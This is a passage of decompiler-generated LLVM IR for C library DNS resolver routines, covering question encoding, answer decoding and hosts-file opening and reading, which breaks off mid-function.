  %v0_1000a4a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4a4 = add i32 %v0_1000a4a4, 4
  %v2_1000a4a4 = inttoptr i32 %v1_1000a4a4 to i8*
  %v3_1000a4a4 = load i8, i8* %v2_1000a4a4, align 1
  %v4_1000a4a4 = zext i8 %v3_1000a4a4 to i32
  %v1_1000a4a8 = add i32 %v0_1000a4a4, 5
  %v2_1000a4a8 = inttoptr i32 %v1_1000a4a8 to i8*
  %v3_1000a4a8 = load i8, i8* %v2_1000a4a8, align 1
  %v4_1000a4a8 = zext i8 %v3_1000a4a8 to i32
  %v1_1000a4ac = mul nuw nsw i32 %v4_1000a4a4, 256
  %v2_1000a4b0 = or i32 %v4_1000a4a8, %v1_1000a4ac
  %v2_1000a4b4 = add i32 %arg2, 32
  %v3_1000a4b4 = inttoptr i32 %v2_1000a4b4 to i32*
  store i32 %v2_1000a4b0, i32* %v3_1000a4b4, align 4
  %v0_1000a4b8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4b8 = add i32 %v0_1000a4b8, 6
  %v2_1000a4b8 = inttoptr i32 %v1_1000a4b8 to i8*
  %v3_1000a4b8 = load i8, i8* %v2_1000a4b8, align 1
  %v4_1000a4b8 = zext i8 %v3_1000a4b8 to i32
  %v1_1000a4bc = add i32 %v0_1000a4b8, 7
  %v2_1000a4bc = inttoptr i32 %v1_1000a4bc to i8*
  %v3_1000a4bc = load i8, i8* %v2_1000a4bc, align 1
  %v4_1000a4bc = zext i8 %v3_1000a4bc to i32
  %v1_1000a4c0 = mul nuw nsw i32 %v4_1000a4b8, 256
  %v2_1000a4c4 = or i32 %v4_1000a4bc, %v1_1000a4c0
  %v2_1000a4c8 = add i32 %arg2, 36
  %v3_1000a4c8 = inttoptr i32 %v2_1000a4c8 to i32*
  store i32 %v2_1000a4c4, i32* %v3_1000a4c8, align 4
  %v0_1000a4cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4cc = add i32 %v0_1000a4cc, 8
  %v2_1000a4cc = inttoptr i32 %v1_1000a4cc to i8*
  %v3_1000a4cc = load i8, i8* %v2_1000a4cc, align 1
  %v4_1000a4cc = zext i8 %v3_1000a4cc to i32
  %v1_1000a4d0 = add i32 %v0_1000a4cc, 9
  %v2_1000a4d0 = inttoptr i32 %v1_1000a4d0 to i8*
  %v3_1000a4d0 = load i8, i8* %v2_1000a4d0, align 1
  %v4_1000a4d0 = zext i8 %v3_1000a4d0 to i32
  %v1_1000a4d4 = mul nuw nsw i32 %v4_1000a4cc, 256
  %v2_1000a4d8 = or i32 %v4_1000a4d0, %v1_1000a4d4
  %v2_1000a4dc = add i32 %arg2, 40
  %v3_1000a4dc = inttoptr i32 %v2_1000a4dc to i32*
  store i32 %v2_1000a4d8, i32* %v3_1000a4dc, align 4
  %v0_1000a4e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4e0 = add i32 %v0_1000a4e0, 10
  %v2_1000a4e0 = inttoptr i32 %v1_1000a4e0 to i8*
  %v3_1000a4e0 = load i8, i8* %v2_1000a4e0, align 1
  %v4_1000a4e0 = zext i8 %v3_1000a4e0 to i32
  %v1_1000a4e4 = add i32 %v0_1000a4e0, 11
  %v2_1000a4e4 = inttoptr i32 %v1_1000a4e4 to i8*
  %v3_1000a4e4 = load i8, i8* %v2_1000a4e4, align 1
  %v4_1000a4e4 = zext i8 %v3_1000a4e4 to i32
  store i32 %v4_1000a4e4, i32* %r9.global-to-local, align 4
  %v1_1000a4e8 = mul nuw nsw i32 %v4_1000a4e0, 256
  %v2_1000a4ec = or i32 %v4_1000a4e4, %v1_1000a4e8
  %v2_1000a4f0 = add i32 %arg2, 44
  %v3_1000a4f0 = inttoptr i32 %v2_1000a4f0 to i32*
  store i32 %v2_1000a4ec, i32* %v3_1000a4f0, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 2, 3, 7, 8, 9, 1, 5, 6, 0, 4 }
  uselistorder i32 11, { 6, 7, 9, 8, 5, 3, 10, 0, 1, 11, 12, 13, 14, 15, 2, 4 }
  uselistorder i32 40, { 1, 2, 5, 4, 3, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 7, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 5, { 15, 16, 9, 10, 11, 4, 5, 12, 1, 13, 14, 3, 2, 17, 18, 6, 7, 0, 8 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 28, { 9, 10, 11, 12, 2, 3, 6, 13, 21, 33, 17, 0, 18, 19, 20, 4, 5, 22, 8, 7, 14, 15, 23, 24, 25, 26, 27, 28, 31, 29, 30, 1, 32, 34, 16 }
  uselistorder i32 29, { 6, 0, 1, 16, 17, 14, 15, 11, 12, 7, 8, 13, 2, 9, 3, 10, 20, 21, 18, 19, 4, 5 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000a514 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a514, i32* %r3.global-to-local, align 4
  store i32 268477724, i32* @lr, align 4
  %v1_1000a518 = inttoptr i32 %v2_1000a514 to i8*
  %v2_1000a518 = call i32 @__encode_dotted(i8* %v1_1000a518)
  store i32 %v2_1000a518, i32* %r3.global-to-local, align 4
  %v1_1000a51c = icmp slt i32 %v2_1000a518, 0
  %v1_1000a520 = load i32, i32* @r29, align 4
  %v2_1000a520 = sub i32 %v1_1000a520, %v2_1000a518
  store i32 %v2_1000a520, i32* @r29, align 4
  br i1 %v1_1000a51c, label %dec_label_pc_1000a560, label %dec_label_pc_1000a52c

dec_label_pc_1000a52c:                            ; preds = %entry
  %v2_1000a524 = icmp sgt i32 %v2_1000a520, 3
  %v0_1000a52c = load i32, i32* @r30, align 4
  %v2_1000a52c = add i32 %v0_1000a52c, %v2_1000a518
  store i32 %v2_1000a52c, i32* %r9.global-to-local, align 4
  br i1 %v2_1000a524, label %dec_label_pc_1000a53c, label %dec_label_pc_1000a534

dec_label_pc_1000a534:                            ; preds = %dec_label_pc_1000a52c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a560

dec_label_pc_1000a53c:                            ; preds = %dec_label_pc_1000a52c
  %v0_1000a53c = load i32, i32* @r31, align 4
  %v1_1000a53c = add i32 %v0_1000a53c, 6
  %v2_1000a53c = inttoptr i32 %v1_1000a53c to i8*
  %v3_1000a53c = load i8, i8* %v2_1000a53c, align 1
  %v5_1000a540 = inttoptr i32 %v2_1000a52c to i8*
  store i8 %v3_1000a53c, i8* %v5_1000a540, align 1
  %v0_1000a544 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a544 = add i32 %v0_1000a544, 4
  store i32 %v1_1000a544, i32* %r3.global-to-local, align 4
  %v0_1000a548 = load i32, i32* @r31, align 4
  %v1_1000a548 = add i32 %v0_1000a548, 4
  %v2_1000a548 = inttoptr i32 %v1_1000a548 to i32*
  %v3_1000a548 = load i32, i32* %v2_1000a548, align 4
  %v1_1000a54c = trunc i32 %v3_1000a548 to i8
  %v2_1000a54c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a54c = add i32 %v2_1000a54c, 1
  %v4_1000a54c = inttoptr i32 %v3_1000a54c to i8*
  store i8 %v1_1000a54c, i8* %v4_1000a54c, align 1
  %v0_1000a550 = load i32, i32* @r31, align 4
  %v1_1000a550 = add i32 %v0_1000a550, 10
  %v2_1000a550 = inttoptr i32 %v1_1000a550 to i8*
  %v3_1000a550 = load i8, i8* %v2_1000a550, align 1
  %v2_1000a554 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a554 = add i32 %v2_1000a554, 2
  %v4_1000a554 = inttoptr i32 %v3_1000a554 to i8*
  store i8 %v3_1000a550, i8* %v4_1000a554, align 1
  %v0_1000a558 = load i32, i32* @r31, align 4
  %v1_1000a558 = add i32 %v0_1000a558, 8
  %v2_1000a558 = inttoptr i32 %v1_1000a558 to i32*
  %v3_1000a558 = load i32, i32* %v2_1000a558, align 4
  %v1_1000a55c = trunc i32 %v3_1000a558 to i8
  %v2_1000a55c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a55c = add i32 %v2_1000a55c, 3
  %v4_1000a55c = inttoptr i32 %v3_1000a55c to i8*
  store i8 %v1_1000a55c, i8* %v4_1000a55c, align 1
  %v0_1000a570.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a560

dec_label_pc_1000a560:                            ; preds = %entry, %dec_label_pc_1000a534, %dec_label_pc_1000a53c
  %v0_1000a570 = phi i32 [ %v2_1000a518, %entry ], [ -1, %dec_label_pc_1000a534 ], [ %v0_1000a570.pre, %dec_label_pc_1000a53c ]
  ret i32 %v0_1000a570

; uselistorder directives
  uselistorder i32 %v2_1000a518, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000a560, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268477828, i32* @lr, align 4
  %v0_1000a580 = call i32 @__length_dotted()
  %v1_1000a584 = icmp slt i32 %v0_1000a580, 0
  br i1 %v1_1000a584, label %dec_label_pc_1000a590, label %dec_label_pc_1000a58c

dec_label_pc_1000a58c:                            ; preds = %entry
  %v1_1000a58c = add i32 %v0_1000a580, 4
  br label %dec_label_pc_1000a590

dec_label_pc_1000a590:                            ; preds = %entry, %dec_label_pc_1000a58c
  %v0_1000a59c = phi i32 [ %v0_1000a580, %entry ], [ %v1_1000a58c, %dec_label_pc_1000a58c ]
  ret i32 %v0_1000a59c

; uselistorder directives
  uselistorder label %dec_label_pc_1000a590, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000a5a4 = load i32, i32* @lr, align 4
  store i32 %v0_1000a5a4, i32* %r0.global-to-local, align 4
  %v2_1000a5ac = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000a5ac, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268477904, i32* @lr, align 4
  %v2_1000a5cc = call i32 @__decode_dotted(i32 %v2_1000a5ac, i32 256)
  store i32 %v2_1000a5cc, i32* @r27, align 4
  %v1_1000a5d0 = icmp slt i32 %v2_1000a5cc, 0
  %v0_1000a5d4 = load i32, i32* @r28, align 4
  %v2_1000a5d4 = add i32 %v0_1000a5d4, %v2_1000a5cc
  store i32 %v2_1000a5d4, i32* @r28, align 4
  %v1_1000a5d8 = load i32, i32* @r29, align 4
  %v2_1000a5d8 = sub i32 %v1_1000a5d8, %v2_1000a5d4
  %v1_1000a5dc = add i32 %v2_1000a5d8, -10
  br i1 %v1_1000a5d0, label %dec_label_pc_1000a698, label %dec_label_pc_1000a5e8

dec_label_pc_1000a5e8:                            ; preds = %entry
  %v0_1000a5ec = load i32, i32* @r26, align 4
  %v2_1000a5ec = add i32 %v0_1000a5ec, %v2_1000a5d4
  store i32 %v2_1000a5ec, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000a5dc, -1
  br i1 %tmp6, label %dec_label_pc_1000a5fc, label %dec_label_pc_1000a5f4

dec_label_pc_1000a5f4:                            ; preds = %dec_label_pc_1000a5e8
  store i32 %v1_1000a5dc, i32* @r27, align 4
  br label %dec_label_pc_1000a698

dec_label_pc_1000a5fc:                            ; preds = %dec_label_pc_1000a5e8
  store i32 268477952, i32* @lr, align 4
  %v1_1000a5fc = call i32 @__GI_strdup(i32 %v2_1000a5ac)
  %v0_1000a600 = load i32, i32* @r30, align 4
  %v1_1000a600 = add i32 %v0_1000a600, 2
  store i32 %v1_1000a600, i32* %r8.global-to-local, align 4
  %v1_1000a604 = load i32, i32* @r31, align 4
  %v2_1000a604 = inttoptr i32 %v1_1000a604 to i32*
  store i32 %v1_1000a5fc, i32* %v2_1000a604, align 4
  %v0_1000a608 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a608 = add i32 %v0_1000a608, 2
  store i32 %v1_1000a608, i32* %r10.global-to-local, align 4
  %v0_1000a60c = load i32, i32* @r30, align 4
  %v1_1000a60c = add i32 %v0_1000a60c, 10
  store i32 %v1_1000a60c, i32* %r6.global-to-local, align 4
  %v0_1000a610 = load i32, i32* @r26, align 4
  %v1_1000a610 = load i32, i32* @r28, align 4
  %v2_1000a610 = add i32 %v1_1000a610, %v0_1000a610
  %v3_1000a610 = inttoptr i32 %v2_1000a610 to i8*
  %v4_1000a610 = load i8, i8* %v3_1000a610, align 1
  %v5_1000a610 = zext i8 %v4_1000a610 to i32
  store i32 %v5_1000a610, i32* %r0.global-to-local, align 4
  %v1_1000a614 = add i32 %v0_1000a60c, 1
  %v2_1000a614 = inttoptr i32 %v1_1000a614 to i8*
  %v3_1000a614 = load i8, i8* %v2_1000a614, align 1
  %v4_1000a614 = zext i8 %v3_1000a614 to i32
  store i32 %v4_1000a614, i32* %r9.global-to-local, align 4
  %v1_1000a618 = mul nuw nsw i32 %v5_1000a610, 256
  %v2_1000a61c = or i32 %v4_1000a614, %v1_1000a618
  store i32 %v2_1000a61c, i32* %r0.global-to-local, align 4
  %v1_1000a620 = load i32, i32* @r31, align 4
  %v2_1000a620 = add i32 %v1_1000a620, 4
  %v3_1000a620 = inttoptr i32 %v2_1000a620 to i32*
  store i32 %v2_1000a61c, i32* %v3_1000a620, align 4
  %v0_1000a624 = load i32, i32* @r30, align 4
  %v1_1000a624 = add i32 %v0_1000a624, 2
  %v2_1000a624 = inttoptr i32 %v1_1000a624 to i8*
  %v3_1000a624 = load i8, i8* %v2_1000a624, align 1
  %v4_1000a624 = zext i8 %v3_1000a624 to i32
  store i32 %v4_1000a624, i32* %r0.global-to-local, align 4
  %v0_1000a628 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a628 = add i32 %v0_1000a628, 1
  %v2_1000a628 = inttoptr i32 %v1_1000a628 to i8*
  %v3_1000a628 = load i8, i8* %v2_1000a628, align 1
  %v4_1000a628 = zext i8 %v3_1000a628 to i32
  store i32 %v4_1000a628, i32* %r9.global-to-local, align 4
  %v1_1000a62c = mul nuw nsw i32 %v4_1000a624, 256
  %v2_1000a630 = or i32 %v4_1000a628, %v1_1000a62c
  store i32 %v2_1000a630, i32* %r0.global-to-local, align 4
  %v1_1000a634 = load i32, i32* @r31, align 4
  %v2_1000a634 = add i32 %v1_1000a634, 8
  %v3_1000a634 = inttoptr i32 %v2_1000a634 to i32*
  store i32 %v2_1000a630, i32* %v3_1000a634, align 4
  %v0_1000a638 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a638 = add i32 %v0_1000a638, 2
  %v2_1000a638 = inttoptr i32 %v1_1000a638 to i8*
  %v3_1000a638 = load i8, i8* %v2_1000a638, align 1
  %v4_1000a638 = zext i8 %v3_1000a638 to i32
  store i32 %v4_1000a638, i32* %r0.global-to-local, align 4
  %v0_1000a63c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a63c = add i32 %v0_1000a63c, 1
  %v2_1000a63c = inttoptr i32 %v1_1000a63c to i8*
  %v3_1000a63c = load i8, i8* %v2_1000a63c, align 1
  %v4_1000a63c = zext i8 %v3_1000a63c to i32
  store i32 %v4_1000a63c, i32* %r11.global-to-local, align 4
  %v1_1000a640 = add i32 %v0_1000a63c, 3
  %v2_1000a640 = inttoptr i32 %v1_1000a640 to i8*
  %v3_1000a640 = load i8, i8* %v2_1000a640, align 1
  %v4_1000a640 = zext i8 %v3_1000a640 to i32
  %v1_1000a644 = mul nuw i32 %v4_1000a638, 16777216
  store i32 %v1_1000a644, i32* %r0.global-to-local, align 4
  %v1_1000a648 = add i32 %v0_1000a63c, 2
  %v2_1000a648 = inttoptr i32 %v1_1000a648 to i8*
  %v3_1000a648 = load i8, i8* %v2_1000a648, align 1
  %v4_1000a648 = zext i8 %v3_1000a648 to i32
  %v1_1000a64c = mul nuw nsw i32 %v4_1000a63c, 65536
  %v2_1000a650 = or i32 %v1_1000a64c, %v1_1000a644
  %v0_1000a654 = load i32, i32* @r28, align 4
  %v1_1000a654 = add i32 %v0_1000a654, 10
  store i32 %v1_1000a654, i32* %r11.global-to-local, align 4
  %v2_1000a658 = or i32 %v2_1000a650, %v4_1000a640
  store i32 %v2_1000a658, i32* %r0.global-to-local, align 4
  %v1_1000a65c = mul nuw nsw i32 %v4_1000a648, 256
  %v2_1000a660 = or i32 %v1_1000a65c, %v2_1000a658
  store i32 %v2_1000a660, i32* %r9.global-to-local, align 4
  %v1_1000a664 = load i32, i32* @r31, align 4
  %v2_1000a664 = add i32 %v1_1000a664, 12
  %v3_1000a664 = inttoptr i32 %v2_1000a664 to i32*
  store i32 %v2_1000a660, i32* %v3_1000a664, align 4
  %v0_1000a668 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a668 = add i32 %v0_1000a668, 6
  %v2_1000a668 = inttoptr i32 %v1_1000a668 to i8*
  %v3_1000a668 = load i8, i8* %v2_1000a668, align 1
  %v4_1000a668 = zext i8 %v3_1000a668 to i32
  store i32 %v4_1000a668, i32* %r9.global-to-local, align 4
  %v0_1000a66c = load i32, i32* @r30, align 4
  %v1_1000a66c = add i32 %v0_1000a66c, 9
  %v2_1000a66c = inttoptr i32 %v1_1000a66c to i8*
  %v3_1000a66c = load i8, i8* %v2_1000a66c, align 1
  %v4_1000a66c = zext i8 %v3_1000a66c to i32
  store i32 %v4_1000a66c, i32* %r0.global-to-local, align 4
  %v1_1000a670 = mul nuw nsw i32 %v4_1000a668, 256
  store i32 %v1_1000a670, i32* %r9.global-to-local, align 4
  %v0_1000a674 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a674 = load i32, i32* @r31, align 4
  %v2_1000a674 = add i32 %v1_1000a674, 24
  %v3_1000a674 = inttoptr i32 %v2_1000a674 to i32*
  store i32 %v0_1000a674, i32* %v3_1000a674, align 4
  %v0_1000a678 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a678 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a678 = or i32 %v1_1000a678, %v0_1000a678
  store i32 %v2_1000a678, i32* %r9.global-to-local, align 4
  %v0_1000a67c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000a67c = load i32, i32* @r31, align 4
  %v2_1000a67c = add i32 %v1_1000a67c, 20
  %v3_1000a67c = inttoptr i32 %v2_1000a67c to i32*
  store i32 %v0_1000a67c, i32* %v3_1000a67c, align 4
  %v0_1000a680 = load i32, i32* @r29, align 4
  %v1_1000a680 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000a680 = icmp slt i32 %v0_1000a680, %v1_1000a680
  %v1_1000a684 = add i32 %v1_1000a680, 10
  store i32 %v1_1000a684, i32* %r0.global-to-local, align 4
  %v0_1000a688 = load i32, i32* @r27, align 4
  %v2_1000a688 = add i32 %v0_1000a688, %v1_1000a684
  store i32 %v2_1000a688, i32* @r27, align 4
  %v1_1000a68c = load i32, i32* @r31, align 4
  %v2_1000a68c = add i32 %v1_1000a68c, 16
  %v3_1000a68c = inttoptr i32 %v2_1000a68c to i32*
  store i32 %v1_1000a680, i32* %v3_1000a68c, align 4
  br i1 %v2_1000a680, label %dec_label_pc_1000a694, label %dec_label_pc_1000a5fc.dec_label_pc_1000a698_crit_edge

dec_label_pc_1000a5fc.dec_label_pc_1000a698_crit_edge: ; preds = %dec_label_pc_1000a5fc
  %v0_1000a69c.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000a698

dec_label_pc_1000a694:                            ; preds = %dec_label_pc_1000a5fc
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000a698

dec_label_pc_1000a698:                            ; preds = %dec_label_pc_1000a5fc.dec_label_pc_1000a698_crit_edge, %entry, %dec_label_pc_1000a5f4, %dec_label_pc_1000a694
  %v0_1000a69c = phi i32 [ %v0_1000a69c.pre, %dec_label_pc_1000a5fc.dec_label_pc_1000a698_crit_edge ], [ %v2_1000a5cc, %entry ], [ %v1_1000a5dc, %dec_label_pc_1000a5f4 ], [ -1, %dec_label_pc_1000a694 ]
  store i32 %v0_1000a5a4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a69c

; uselistorder directives
  uselistorder i32 %v1_1000a680, { 1, 0, 2 }
  uselistorder i32 %v1_1000a644, { 1, 0 }
  uselistorder i32 %v1_1000a5dc, { 1, 2, 0 }
  uselistorder i32 %v2_1000a5cc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000a5ac, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 9, 10, 11, 12, 3, 16, 13, 14, 17, 18, 19, 20, 5, 6, 8, 7, 0, 30, 31, 21, 22, 23, 24, 25, 27, 28, 26, 29, 15, 1, 2, 4 }
  uselistorder i32 9, { 8, 9, 10, 11, 2, 12, 3, 13, 4, 14, 0, 15, 16, 17, 18, 19, 1, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a698, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_1000a6b4 = load i32, i32* @lr, align 4
  store i32 268478168, i32* @lr, align 4
  %v3_1000a6d4 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1000d020.480 to i32), i32 ptrtoint (i32* @global_var_1000cfbc.448 to i32))
  %v3_1000a6dc = icmp eq i32 %v3_1000a6d4, 0
  br i1 %v3_1000a6dc, label %dec_label_pc_1000a6e4, label %dec_label_pc_1000a700

dec_label_pc_1000a6e4:                            ; preds = %entry
  %v0_1000a6d8 = load i32, i32* @r29, align 4
  store i32 %v0_1000a6b4, i32* @lr, align 4
  %v3_1000a6fc = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1000d02c.481 to i32), i32 %v0_1000a6d8)
  br label %dec_label_pc_1000a700

dec_label_pc_1000a700:                            ; preds = %entry, %dec_label_pc_1000a6e4
  %v0_1000a710 = phi i32 [ %v3_1000a6d4, %entry ], [ %v3_1000a6fc, %dec_label_pc_1000a6e4 ]
  ret i32 %v0_1000a710

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 7, 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_1000a700, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000a714 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_1000a728 = sub i32 0, %arg6
  %v1_1000a72c = urem i32 %v1_1000a728, 4
  store i32 %v1_1000a72c, i32* %r0.global-to-local, align 4
  %v3_1000a72c = icmp eq i32 %v1_1000a72c, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000a744 = load i32, i32* @r10, align 4
  store i32 %v0_1000a744, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000a760.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000a72c, label %dec_label_pc_1000a760, label %dec_label_pc_1000a750

dec_label_pc_1000a750:                            ; preds = %entry
  %v2_1000a750 = icmp ult i32 %v0_1000a760.pr, %v1_1000a72c
  br i1 %v2_1000a750, label %dec_label_pc_1000aa14, label %dec_label_pc_1000a758

dec_label_pc_1000a758:                            ; preds = %dec_label_pc_1000a750
  %v2_1000a758 = sub i32 %v0_1000a760.pr, %v1_1000a72c
  store i32 %v2_1000a758, i32* %r9.global-to-local, align 4
  %v2_1000a75c = add i32 %v1_1000a72c, %arg6
  store i32 %v2_1000a75c, i32* @r30, align 4
  br label %dec_label_pc_1000a760

dec_label_pc_1000a760:                            ; preds = %entry, %dec_label_pc_1000a758
  %v0_1000a76c = phi i32 [ %v2_1000a75c, %dec_label_pc_1000a758 ], [ %arg6, %entry ]
  %v0_1000a770 = phi i32 [ %v2_1000a758, %dec_label_pc_1000a758 ], [ %v0_1000a760.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_1000a770, 32
  br i1 %tmp49, label %dec_label_pc_1000aa14, label %dec_label_pc_1000a768

dec_label_pc_1000a768:                            ; preds = %dec_label_pc_1000a760
  %v3_1000a768 = icmp eq i32 %arg4, 1
  %v1_1000a76c = add i32 %v0_1000a76c, 32
  store i32 %v1_1000a76c, i32* @r24, align 4
  %v1_1000a770 = add i32 %v0_1000a770, -32
  store i32 %v1_1000a770, i32* @r27, align 4
  br i1 %v3_1000a768, label %dec_label_pc_1000a870, label %dec_label_pc_1000a778

dec_label_pc_1000a778:                            ; preds = %dec_label_pc_1000a768
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000a780 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000a780, align 4
  %tmp50 = icmp ult i32 %v1_1000a770, 4
  br i1 %tmp50, label %dec_label_pc_1000aa14, label %dec_label_pc_1000a788

dec_label_pc_1000a788:                            ; preds = %dec_label_pc_1000a778
  %v0_1000a788 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a788 = add i32 %v0_1000a788, -36
  store i32 %v1_1000a788, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000a788, 8
  br i1 %tmp51, label %dec_label_pc_1000aa14, label %dec_label_pc_1000a794

dec_label_pc_1000a794:                            ; preds = %dec_label_pc_1000a788
  %v0_1000a794 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000a794, 16
  br i1 %tmp52, label %dec_label_pc_1000aa14, label %dec_label_pc_1000a79c

dec_label_pc_1000a79c:                            ; preds = %dec_label_pc_1000a794
  %v1_1000a79c = add i32 %v0_1000a788, -48
  store i32 %v1_1000a79c, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000a79c, 8
  br i1 %tmp53, label %dec_label_pc_1000aa14, label %dec_label_pc_1000a7a8

dec_label_pc_1000a7a8:                            ; preds = %dec_label_pc_1000a79c
  %v1_1000a7a8 = add i32 %v0_1000a788, -56
  store i32 %v1_1000a7a8, i32* %r0.global-to-local, align 4
  %v1_1000a7ac = add i32 %v0_1000a788, -44
  store i32 %v1_1000a7ac, i32* @r27, align 4
  %v3_1000a7b0 = icmp ugt i32 %v1_1000a7a8, %v1_1000a7ac
  %v0_1000a7b4 = load i32, i32* @r30, align 4
  %v1_1000a7b4 = add i32 %v0_1000a7b4, 36
  store i32 %v1_1000a7b4, i32* @r29, align 4
  %v1_1000a7b8 = add i32 %v0_1000a7b4, 48
  store i32 %v1_1000a7b8, i32* @r26, align 4
  br i1 %v3_1000a7b0, label %dec_label_pc_1000a7cc, label %dec_label_pc_1000a7c4

dec_label_pc_1000a7c4:                            ; preds = %dec_label_pc_1000a7a8
  store i32 %v1_1000a7a8, i32* @r27, align 4
  br label %dec_label_pc_1000a7cc

dec_label_pc_1000a7cc:                            ; preds = %dec_label_pc_1000a7a8, %dec_label_pc_1000a7c4
  %v0_1000a7cc = phi i32 [ %v1_1000a7a8, %dec_label_pc_1000a7c4 ], [ %v1_1000a7ac, %dec_label_pc_1000a7a8 ]
  %tmp54 = icmp ult i32 %v0_1000a7cc, 80
  br i1 %tmp54, label %dec_label_pc_1000aa14, label %dec_label_pc_1000a7d4

dec_label_pc_1000a7d4:                            ; preds = %dec_label_pc_1000a7cc
  store i32 268478424, i32* @lr, align 4
  %v0_1000a7d4 = call i32 @__open_etc_hosts()
  store i32 %v0_1000a7d4, i32* @r20, align 4
  %v3_1000a7d8 = icmp eq i32 %v0_1000a7d4, 0
  br i1 %v3_1000a7d8, label %dec_label_pc_1000a7f8, label %dec_label_pc_1000a7e0

dec_label_pc_1000a7e0:                            ; preds = %dec_label_pc_1000a7d4
  %v0_1000a7e0 = load i32, i32* @r24, align 4
  store i32 %v0_1000a7e0, i32* @r25, align 4
